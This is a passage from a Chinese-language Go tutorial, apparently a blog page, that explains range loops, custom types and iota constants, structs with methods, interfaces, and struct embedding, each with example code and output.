Apple,value: 苹果<br>key: Orange,value: 橘子<br>key: Bannana,value: 香蕉<br>---通道的遍历---<br>值：10<br>值：11<br>值：12<br>值：13<br>值：14<br><br><br></code></pre></td></tr></table></figure><p><strong>若是在开发过程中只想用到遍历对象的索引或者值</strong>。可以使用<code>_</code>来接收不需要使用的值。如果是只想用索引的话，可以直接只用一个参数接收遍历对象传出的值，<strong>默认只会接收索引</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>m := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;Apple&quot;</span>: <span class="hljs-string">&quot;苹果&quot;</span>, <span class="hljs-string">&quot;Orange&quot;</span>: <span class="hljs-string">&quot;橘子&quot;</span>, <span class="hljs-string">&quot;Banana&quot;</span>: <span class="hljs-string">&quot;香蕉&quot;</span>&#125;<br>fmt.Println(<span class="hljs-string">&quot;---map的key值---&quot;</span>)<br><span class="hljs-comment">//只取key</span><br><span class="hljs-keyword">for</span> k := <span class="hljs-keyword">range</span> m &#123;<br>fmt.Printf(<span class="hljs-string">&quot;key:%s\n&quot;</span>, k)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;---map的value值---&quot;</span>)<br><span class="hljs-comment">//只取value</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> m &#123;<br>fmt.Printf(<span class="hljs-string">&quot;value: %s\n&quot;</span>, v)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex">---map的key值---<br>key:Apple<br>key:Orange<br>key:Banana<br>---map的value值---<br>value: 苹果<br>value: 橘子<br>value: 香蕉<br></code></pre></td></tr></table></figure><h2 id="2-注意事项"><a href="#2-注意事项" class="headerlink" title="2. 注意事项"></a>2. 注意事项</h2><p>在使用 range 的时候需要注意，<strong>我们无法通过range输出的值来修改遍历的对象</strong>，因为range相当于<strong>声明了两个变量</strong>，这两个变量逐一<strong>复制</strong>了遍历对象中的值，归根结底还是因为 <strong>Go 语言只有值传递，没有引用传递</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>intSlice := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br><br><span class="hljs-comment">// 遍历切片</span><br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> intSlice &#123;<br>fmt.Printf(<span class="hljs-string">&quot;索引: %d,索引地址: %p\n&quot;</span>, k, &amp;k)<br>fmt.Printf(<span class="hljs-string">&quot;值：%d,值地址：%p\n&quot;</span>, v, &amp;v)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tex">索引: 0,索引地址: 0x1400001c0a8<br>值：1,值地址：0x1400001c0b0<br>索引: 1,索引地址: 0x1400001c0a8<br>值：2,值地址：0x1400001c0b0<br>索引: 2,索引地址: 0x1400001c0a8<br>值：3,值地址：0x1400001c0b0<br>索引: 3,索引地址: 0x1400001c0a8<br>值：4,值地址：0x1400001c0b0<br>索引: 4,索引地址: 0x1400001c0a8<br>值：5,值地址：0x1400001c0b0<br></code></pre></td></tr></table></figure><h1 id="Go-语言拓展已有类型"><a href="#Go-语言拓展已有类型" class="headerlink" title="Go 语言拓展已有类型"></a>Go 语言拓展已有类型</h1><p>在开发中，仅仅使用 Go 语言自带的变量是无法满足我们的业务需求的，就算勉强能满足，但对整个项目代码后期的维护和其可读性，都会带来很大的不便。所以几乎所有语言都支持自定义数据类型。在 Go 语言中可以使用 <strong>type</strong> 关键字自定义数据类型。</p><h2 id="1-自定义复杂类型"><a href="#1-自定义复杂类型" class="headerlink" title="1. 自定义复杂类型"></a>1. 自定义复杂类型</h2><p>可以使用<code>type Name Type</code>去自定义一个<strong>全新的数据类型</strong>。这个类型的变量就使用<code>Name</code>来声明。通常<strong>type</strong>用于将一个<strong>复杂的数据类型定义为一个全新的数据类型</strong>，便于后续使用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br><span class="hljs-string">&quot;fmt&quot;</span>  <br><span class="hljs-string">&quot;reflect&quot;</span>  <br>)  <br>  <br><span class="hljs-keyword">type</span> stringList []<span class="hljs-type">string</span> <span class="hljs-comment">//自定义一个数据类型，这个数据类型为字符串切片，命名为 stringList  </span><br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>strList := stringList&#123;<span class="hljs-string">&quot;test1&quot;</span>, <span class="hljs-string">&quot;test2&quot;</span>&#125; <span class="hljs-comment">//给变量 strList 定义为 stringList 类型并赋值  </span><br>fmt.Println(<span class="hljs-string">&quot;strList的数据类型: &quot;</span>, reflect.TypeOf(strList)) <span class="hljs-comment">//打印 strList 的数据类型  </span><br>fmt.Println(<span class="hljs-string">&quot;strList的值: &quot;</span>, reflect.TypeOf(strList)) <span class="hljs-comment">//打印 strList 的值  </span><br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">strList的数据类型:  main.stringList<br>strList的值:  main.stringList<br></code></pre></td></tr></table></figure><h2 id="2-别名"><a href="#2-别名" class="headerlink" title="2. 别名"></a>2. 别名</h2><p><strong>type</strong>关键字还有一种用法，就是以<strong>已经存在的数据类型</strong>进行类型自定义，这种用法就叫做<strong>别名</strong>。顾名思义，就是给已经存在的数据类型起一个新名字。常用于使用常量来开发<strong>枚举</strong>功能时。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-keyword">type</span> Grade <span class="hljs-type">int</span>  <br>  <br><span class="hljs-keyword">const</span> (  <br>FirstGrade Grade = <span class="hljs-literal">iota</span>  <br>SecondGrade  <br>ThirdGrade  <br>FourthGrade  <br>FifthGrade  <br>SixthGrade  <br>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>fmt.Println(<span class="hljs-string">&quot;FirstGrade :&quot;</span>, FirstGrade)  <br>fmt.Println(<span class="hljs-string">&quot;SecondGrade :&quot;</span>, SecondGrade)  <br>fmt.Println(<span class="hljs-string">&quot;ThirdGrade :&quot;</span>, ThirdGrade)  <br>fmt.Println(<span class="hljs-string">&quot;FourthGrade :&quot;</span>, FourthGrade)  <br>fmt.Println(<span class="hljs-string">&quot;FifthGrade :&quot;</span>, FifthGrade)  <br>fmt.Println(<span class="hljs-string">&quot;SixthGrade :&quot;</span>, SixthGrade)  <br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada">FirstGrade : 0<br>SecondGrade : 1<br>ThirdGrade : 2<br>FourthGrade : 3<br>FifthGrade : 4<br>SixthGrade : 5<br></code></pre></td></tr></table></figure><h1 id="Go-语言的结构体和“面向对象”"><a href="#Go-语言的结构体和“面向对象”" class="headerlink" title="Go 语言的结构体和“面向对象”"></a>Go 语言的结构体和“面向对象”</h1><p>Go 语言中没有明确的面向对象的概念，当然也没有明确的面向过程的概念。面向哪一方面编程完全取决于程序员如何使用，如果想要面向对象编程，Go 语言中提供了相对应的解决方案来模拟面向对象。</p><h2 id="1-结构体类型"><a href="#1-结构体类型" class="headerlink" title="1.  结构体类型"></a>1.  结构体类型</h2><p>想要模拟面向对象就首先要了解一下 Go 语言中的结构体类型。当需要两个以上的基本数据类型或自定义类型来声明定义函数的时候，就可以使用结构体。结构体变量使用<code>struct&#123;...&#125;</code>的形式来定义。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br><span class="hljs-string">&quot;fmt&quot;</span>  <br><span class="hljs-string">&quot;reflect&quot;</span>  <br>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br><span class="hljs-keyword">var</span> student1 <span class="hljs-keyword">struct</span> &#123;  <br>Name <span class="hljs-type">string</span>  <br>Age <span class="hljs-type">int</span>  <br>&#125;  <br>student1.Name = <span class="hljs-string">&quot;Mochazz&quot;</span>  <br>student1.Age = <span class="hljs-number">18</span>  <br>  <br>fmt.Println(<span class="hljs-string">&quot;student1数据类型: &quot;</span>, reflect.TypeOf(student1))  <br>fmt.Println(<span class="hljs-string">&quot;student1的值：&quot;</span>, reflect.ValueOf(student1))  <br>  <br>student2 := <span class="hljs-keyword">struct</span> &#123;  <br>Name <span class="hljs-type">string</span>  <br>Age <span class="hljs-type">int</span>  <br>&#125;&#123;  <br>Name: <span class="hljs-string">&quot;Mochazz&quot;</span>,  <br>Age: <span class="hljs-number">18</span>, <span class="hljs-comment">//逗号不能忘记，若是和大括号同行时逗号才能省略  </span><br>&#125;  <br>fmt.Println(<span class="hljs-string">&quot;student2的数据类型: &quot;</span>, reflect.TypeOf(student2))  <br>fmt.Println(<span class="hljs-string">&quot;student2的值: &quot;</span>, reflect.ValueOf(student2))  <br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp">student1数据类型:  <span class="hljs-keyword">struct</span> &#123; Name <span class="hljs-built_in">string</span>; Age <span class="hljs-built_in">int</span> &#125;<br>student1的值： &#123;Mochazz <span class="hljs-number">18</span>&#125;<br>student2的数据类型:  <span class="hljs-keyword">struct</span> &#123; Name <span class="hljs-built_in">string</span>; Age <span class="hljs-built_in">int</span> &#125;<br>student2的值:  &#123;Mochazz <span class="hljs-number">18</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-使用自定义类型来模拟对象"><a href="#2-使用自定义类型来模拟对象" class="headerlink" title="2. 使用自定义类型来模拟对象"></a>2. 使用自定义类型来模拟对象</h2><p>使用自定义数据类型的方式来自定义一个结构体类型，这样就可以达到定义一个对象的相同效果。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br><span class="hljs-string">&quot;fmt&quot;</span>  <br><span class="hljs-string">&quot;reflect&quot;</span>  <br>)  <br>  <br><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123; <span class="hljs-comment">//自定义一个结构体数据类型 Student。也可以解读为，创建一个&quot;Student类&quot;  </span><br>Name <span class="hljs-type">string</span>  <br>Age <span class="hljs-type">int</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br><span class="hljs-keyword">var</span> student1 Student <span class="hljs-comment">//声明一个 Student 类型的变量 student1。也可以解读为，创建一个&quot;Student对象&quot;  </span><br>  <br>student1.Name = <span class="hljs-string">&quot;Mochazz&quot;</span>  <br>student1.Age = <span class="hljs-number">18</span>  <br>  <br>fmt.Println(<span class="hljs-string">&quot;student1数据类型: &quot;</span>, reflect.TypeOf(student1))  <br>fmt.Println(<span class="hljs-string">&quot;student1的值：&quot;</span>, reflect.ValueOf(student1))  <br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">student1数据类型:  <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.Student</span><br>student1的值： &#123;Mochazz <span class="hljs-number">18</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-使用函数来模拟面向对象的方法"><a href="#3-使用函数来模拟面向对象的方法" class="headerlink" title="3. 使用函数来模拟面向对象的方法"></a>3. 使用函数来模拟面向对象的方法</h2><p>Go 语言中的函数为自定义数据类型提供了一种特别的使用方式，形如<br><code>func(变量名 自定义数据类型)函数名(...)&#123;...&#125;</code>。<br>函数名前可以接收一个自定数据类型的参数，参数传递的形式为<code>自定义数据类型变量.函数名()</code>的形式传递，这样外表看起来就和面向对象编程一致了。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;  <br>Name <span class="hljs-type">string</span>  <br>Age <span class="hljs-type">int</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newStudent</span><span class="hljs-params">(name <span class="hljs-type">string</span>, age <span class="hljs-type">int</span>)</span></span> Student &#123;  <br><span class="hljs-keyword">return</span> Student&#123;Name: name, Age: age&#125;  <br>&#125;  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s Student)</span></span> PrintAge() &#123; <span class="hljs-comment">//打印传入的 Student 自定义类型参数 Age 属性。也可以解读为创建一个打印学生&quot;对象&quot;年龄的&quot;方法&quot;  </span><br>fmt.Println(s.Age)  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>student1 := newStudent(<span class="hljs-string">&quot;Mochazz&quot;</span>, <span class="hljs-number">18</span>)  <br>student2 := newStudent(<span class="hljs-string">&quot;Moka&quot;</span>, <span class="hljs-number">19</span>)  <br>fmt.Println(<span class="hljs-string">&quot;student1年龄: &quot;</span>)  <br>student1.PrintAge() <span class="hljs-comment">//使用自定义类型变量 student1 为参数调用 PrintAge。也可也解读为 student1 &quot;对象&quot;调用PrintAge “方法”  </span><br>fmt.Println(<span class="hljs-string">&quot;student2年龄：&quot;</span>)  <br>student2.PrintAge()  <br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">stude<span class="hljs-symbol">nt1</span>年龄: <br><span class="hljs-number">18</span><br>stude<span class="hljs-symbol">nt2</span>年龄：<br><span class="hljs-number">19</span><br></code></pre></td></tr></table></figure><h1 id="Go-语言中的接口"><a href="#Go-语言中的接口" class="headerlink" title="Go 语言中的接口"></a>Go 语言中的接口</h1><p>在所有编程语言中，接口都是一些<strong>方法的集合</strong>，通常都是”类”们都需要实现的一些公共方法。使这些”类”在使用过程中多了一层抽象。在使用接口时无需在意这些方法是如何实现的，只需在意这个接口中的方法本身。<br>Go 语言提倡<strong>面向接口编程</strong>，一来增强代码的可读性，二来可以使代码的模块之间的关系变得更加清晰、边界更加明显。</p><h2 id="1-接口的定义"><a href="#1-接口的定义" class="headerlink" title="1. 接口的定义"></a>1. 接口的定义</h2><p>在 Go 语言中，接口也是一个数据类型，该类型使用结构 <code>interface&#123;...&#125;</code> 来定义。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> stuInterface <span class="hljs-keyword">interface</span>&#123;<br>    PrintAge()<br>&#125;<br></code></pre></td></tr></table></figure><p>以上代码定义可一个接口类型的变量，其中包含的方法为 PrintAge()。</p><h2 id="2-接口实现"><a href="#2-接口实现" class="headerlink" title="2. 接口实现"></a>2. 接口实现</h2><p>在 Go 语言的接口中有两个非常重要的特性：</p><ul><li>只要有类<strong>实现（模拟）了接口中包含的所有方法，就称这个类型实现了这个接口</strong>；</li><li>只要是实现了这个接口的类型，用这个类型定义的变量就可以给这个<strong>接口声明的变量赋值</strong>。</li></ul><p>所以从以上两个特性也可以推出 <strong>interface{}</strong> 类型的变量，可以接收 <strong>任何变量的赋值</strong>。这两个特性也被称为鸭子类型，即”走起来像鸭子，叫起来像鸭子（类型模拟了接口中包含的所有方法），那么它就是一只鸭子”。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-keyword">var</span> stuInterface <span class="hljs-keyword">interface</span> &#123;  <br>PrintAge()  <br>&#125;  <br>  <br><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;  <br>Name <span class="hljs-type">string</span>  <br>Age <span class="hljs-type">int</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s Student)</span></span> PrintAge() &#123;  <br>fmt.Println(s.Age)  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>stuInterface = Student&#123;  <br>Name: <span class="hljs-string">&quot;Mochazz&quot;</span>,  <br>Age: <span class="hljs-number">18</span>,  <br>&#125;  <br>stuInterface.PrintAge()  <br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">18<br></code></pre></td></tr></table></figure><h2 id="3-自定义接口类型"><a href="#3-自定义接口类型" class="headerlink" title="3. 自定义接口类型"></a>3. 自定义接口类型</h2><p>为了方便使用，一般都会使用自定义类型来定义一个接口类型。同时还可以写一个函数来实例化接口。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-keyword">type</span> StudentInterface <span class="hljs-keyword">interface</span> &#123;  <br>PrintAge()  <br>&#125;  <br>  <br><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;  <br>Name <span class="hljs-type">string</span>  <br>Age <span class="hljs-type">int</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s Student)</span></span> PrintAge() &#123;  <br>fmt.Println(s.Age)  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newStudent</span><span class="hljs-params">(name <span class="hljs-type">string</span>, age <span class="hljs-type">int</span>)</span></span> StudentInterface &#123;  <br><span class="hljs-keyword">return</span> Student&#123;  <br>Name: name,  <br>Age: age,  <br>&#125;  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>stuInterface := newStudent(<span class="hljs-string">&quot;Mochazz&quot;</span>, <span class="hljs-number">18</span>)  <br>  <br>stuInterface.PrintAge()  <br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">18<br></code></pre></td></tr></table></figure><h1 id="Go-语言类型的内嵌"><a href="#Go-语言类型的内嵌" class="headerlink" title="Go 语言类型的内嵌"></a>Go 语言类型的内嵌</h1><p>在 Go 语言中的类型是可以直接内嵌到结构体中的，可以看作是一个没有属性名的属性。同时接口中也可以内嵌接口，并且只能内嵌接口。</p><h2 id="1-结构体内嵌类型"><a href="#1-结构体内嵌类型" class="headerlink" title="1. 结构体内嵌类型"></a>1. 结构体内嵌类型</h2><p>结构体中内嵌类型在开发中用的并不多，这只是一个延伸特性。意味着结构体在定义属性字段的时候可以只写类型，不写属性名，但是一个类型只能写一个，不然结构体会无法识别你调用的时候使用的是哪个字段，这种只写类型不写属性名的属性被称为匿名字段。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;  <br>Name <span class="hljs-type">string</span>  <br>Age <span class="hljs-type">int</span>  <br><span class="hljs-type">int</span>  <span class="hljs-comment">//结构体中内嵌了一个int类型</span><br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newStudent</span><span class="hljs-params">(name <span class="hljs-type">string</span>, age <span class="hljs-type">int</span>)</span></span> Student &#123;  <br><span class="hljs-keyword">return</span> Student&#123;  <br>Name: name,  <br>Age: age,  <br><span class="hljs-type">int</span>: <span class="hljs-number">10</span>, <span class="hljs-comment">//给匿名字段赋值的时候直接使用其字段类型即可  </span><br>&#125;  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>stu := newStudent(<span class="hljs-string">&quot;Mochazz&quot;</span>, <span class="hljs-number">18</span>)  <br>fmt.Println(<span class="hljs-string">&quot;匿名字段的值: &quot;</span>, stu.<span class="hljs-type">int</span>) <span class="hljs-comment">//打印匿名字段的值  </span><br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">匿名字段的值:  10</span><br></code></pre></td></tr></table></figure><h2 id="2-结构体内嵌结构体"><a href="#2-结构体内嵌结构体" class="headerlink" title="2. 结构体内嵌结构体"></a>2. 结构体内嵌结构体</h2><p>结构体内嵌结构体是用的最多的一种内嵌方式。它有点类似于面向对向语言中的继承，但是面向对象的设计原则中最好不要有多继承。甚至于 java 这个面向对象语言的老大哥，直接就是不允许多继承的。所以 Go 语言中的内嵌结构体更好理解为组合。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-keyword">type</span> Callabale <span class="hljs-keyword">struct</span>&#123;&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c Callabale)</span></span> Call() &#123;  <br>fmt.Println(<span class="hljs-string">&quot;can call&quot;</span>)  <br>&#125;  <br>  <br><span 